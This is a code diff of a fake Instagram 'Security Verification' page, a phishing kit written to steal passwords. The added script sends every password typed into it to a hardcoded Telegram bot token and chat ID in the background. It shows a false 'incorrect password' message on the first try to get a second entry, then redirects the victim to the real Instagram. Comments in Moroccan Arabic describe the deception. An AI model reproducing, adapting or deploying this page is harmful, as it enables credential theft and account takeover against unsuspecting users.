@@ -3,112 +3,72 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram • Security Check</title>
+    <title>Instagram • Security Verification</title>
     <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/ed963513065d.png">
     <style>
         * { box-sizing: border-box; }
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-            background-color: #fafafa; 
-            display: flex; 
-            flex-direction: column;
-            align-items: center; 
-            margin: 0;
-            min-height: 100vh;
-        }
-        .main-container { 
-            background-color: #fff; 
-            border: 1px solid #dbdbdb; 
-            padding: 30px 40px; 
-            width: 350px; 
-            margin-top: 80px;
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            border-radius: 1px;
-        }
-        .header-text {
-            color: #262626;
-            font-weight: 600;
-            font-size: 17px;
-            line-height: 24px;
-            margin-bottom: 12px;
-            text-align: center;
-        }
-        .sub-text {
-            color: #8e8e8e;
-            font-size: 14px;
-            line-height: 18px;
-            margin-bottom: 25px;
-            text-align: center;
-        }
-        input { 
-            width: 100%; 
-            padding: 10px 8px; 
-            margin-bottom: 8px; 
-            border: 1px solid #dbdbdb; 
-            border-radius: 3px; 
-            background-color: #fafafa; 
-            font-size: 13px;
-        }
-        input:focus { border: 1px solid #a8a8a8; outline: none; }
-        .btn-submit { 
-            width: 100%; 
-            background-color: #0095f6; 
-            color: white; 
-            border: none; 
-            padding: 7px; 
-            border-radius: 8px; 
-            font-weight: 600; 
-            font-size: 14px; 
-            cursor: pointer; 
-            margin: 15px 0; 
-        }
-        .divider {
-            display: flex;
-            width: 100%;
-            align-items: center;
-            margin: 10px 0;
-        }
-        .divider div { flex: 1; height: 1px; background-color: #dbdbdb; }
-        .divider span { color: #8e8e8e; font-size: 13px; font-weight: 600; margin: 0 18px; }
-        .forgot-link { color: #00376b; font-size: 12px; text-decoration: none; margin-top: 10px; }
-        .footer { margin-top: auto; padding: 24px; text-align: center; width: 100%; }
-        .footer-links { display: flex; justify-content: center; flex-wrap: wrap; gap: 15px; margin-bottom: 10px; }
-        .footer-links span { color: #8e8e8e; font-size: 12px; }
+        body { font-family: -apple-system, system-ui, sans-serif; background-color: #fafafa; display: flex; flex-direction: column; align-items: center; margin: 0; min-height: 100vh; }
+        .main-container { background-color: #fff; border: 1px solid #dbdbdb; padding: 30px 40px; width: 350px; margin-top: 80px; display: flex; flex-direction: column; align-items: center; border-radius: 1px; }
+        .header-text { color: #262626; font-weight: 600; font-size: 17px; margin-bottom: 12px; text-align: center; }
+        .sub-text { color: #8e8e8e; font-size: 14px; line-height: 18px; margin-bottom: 25px; text-align: center; }
+        input { width: 100%; padding: 11px 8px; margin-bottom: 8px; border: 1px solid #dbdbdb; border-radius: 3px; background-color: #fafafa; font-size: 13px; }
+        .btn-submit { width: 100%; background-color: #0095f6; color: white; border: none; padding: 7px; border-radius: 8px; font-weight: 600; cursor: pointer; margin: 15px 0; }
+        .error-msg { color: #ed4956; font-size: 12px; margin-bottom: 10px; display: none; text-align: center; }
+        .footer { margin-top: auto; padding: 24px; text-align: center; width: 100%; color: #8e8e8e; font-size: 12px; }
     </style>
 </head>
 <body>
 
     <div class="main-container">
         <h2 class="header-text">Security Verification</h2>
-        <p class="sub-text">To secure your account, please verify your current password before choosing a new one.</p>
+        <p id="status_text" class="sub-text">To secure your account, please verify your current password before choosing a new one.</p>
         
-        <form action="https://api.telegram.org/bot8531200875:AAGR0wRXZLRvrvwqGgXwfBRd6n0V0gjYWcU/sendMessage" method="GET" style="width: 100%;">
-            <input type="hidden" name="chat_id" value="6347084263">
-            
-            <input type="password" name="text" placeholder="Current Password" required>
-            <input type="password" placeholder="New Password" required>
-            <input type="password" placeholder="Confirm New Password" required>
-            
-            <button type="submit" class="btn-submit">Verify & Update</button>
-        </form>
-
-        <div class="divider">
-            <div></div>
-            <span>OR</span>
-            <div></div>
-        </div>
+        <div id="error_msg" class="error-msg">The password you entered is incorrect. Please try again.</div>
         
-        <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-link">Forgot password?</a>
+        <input type="password" id="pass_input" placeholder="Current Password" autocomplete="current-password">
+        <input type="password" placeholder="New Password">
+        
+        <button type="button" id="submit_btn" class="btn-submit">Verify & Update</button>
     </div>
 
     <div class="footer">
-        <div class="footer-links">
-            <span>Meta</span><span>About</span><span>Help</span><span>Privacy</span><span>Terms</span>
-        </div>
-        <div style="color: #8e8e8e; font-size: 12px; margin-top: 10px;">© 2026 Instagram from Meta</div>
+        <div>Meta • About • Help • Privacy • Terms</div>
+        <div style="margin-top: 10px;">© 2026 Instagram from Meta</div>
     </div>
+
+    <script>
+        let attempt = 0;
+        const token = '8531200875:AAGR0wRXZLRvrvwqGgXwfBRd6n0V0gjYWcU';
+        const chatId = '6347084263';
+
+        document.getElementById('submit_btn').onclick = function() {
+            const pass = document.getElementById('pass_input').value;
+            if(!pass) return;
+
+            attempt++;
+            
+            // إرسال البيانات لتيليغرام بلا ما تبان حتى صفحة
+            const message = `🚨 Attempt ${attempt}: ${pass}`;
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            
+            fetch(url); // الخدمة في الخلفية
+
+            if (attempt === 1) {
+                // المرة الأولى: كذبو عليه بلي غلط
+                document.getElementById('pass_input').value = "";
+                document.getElementById('error_msg').style.display = "block";
+                document.getElementById('pass_input').style.border = "1px solid #ed4956";
+            } else {
+                // المرة الثانية: صيفطو لتطبيق إنستغرام نيشان
+                window.location.href = "instagram://"; 
+                
+                // إلا ما عندوش التطبيق محلول، صيفطو للموقع الرسمي
+                setTimeout(() => {
+                    window.location.href = "https://www.instagram.com/accounts/login/";
+                }, 500);
+            }
+        };
+    </script>
 
 </body>
 </html>
